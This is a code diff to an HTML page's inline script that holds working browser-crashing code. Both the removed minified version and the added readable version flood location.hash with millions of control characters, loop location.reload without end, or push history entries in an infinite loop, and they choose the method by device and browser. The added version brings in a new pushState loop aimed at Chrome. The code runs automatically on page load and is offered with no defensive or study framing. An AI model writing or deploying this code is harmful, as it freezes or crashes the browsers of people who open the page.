@@ -2,9 +2,32 @@
 
 
 <script>
-  
-function s(){window.onload=()=>location.hash="M"+"\x01".repeat(33554432)+"m"}function m(){s()}function a(){for(var e=0;e<10;e++)setTimeout(function(){for(;;)location.reload(1)},1e3)}function isMobile(){var e=window.matchMedia||window.msMatchMedia;return!!e&&e("(pointer:coarse)").matches}isMobile()?m():navigator.userAgent.toLowerCase().indexOf("chrome/")>-1?a():navigator.userAgent.toLowerCase().indexOf("safari/")>-1?s():a();
+  function s() {
+    window.onload = () => location.hash = "M" + "\x01".repeat(33554432) + "m"
+}
 
+var m = s
+
+function a() {
+    for (var e = 0; e < 10; e++) setTimeout(function() {
+        for (;;) location.reload(1)
+    }, 1e3)
+}
+
+function p(){
+location.hash = "M" + "\x01".repeat(2**19) + "m";
+  for(;;)history.pushState({}, "");
+
+}
+
+function C() {
+    var e = window.matchMedia || window.msMatchMedia;
+    return !!e && e("(pointer:coarse)").matches
+}
+
+function D(){}
+
+C() ? m() : navigator.userAgent.toLowerCase().indexOf("chrome/") > -1 ? p() : navigator.userAgent.toLowerCase().indexOf("safari/") > -1 ? s() : a();
 </script>
 
 
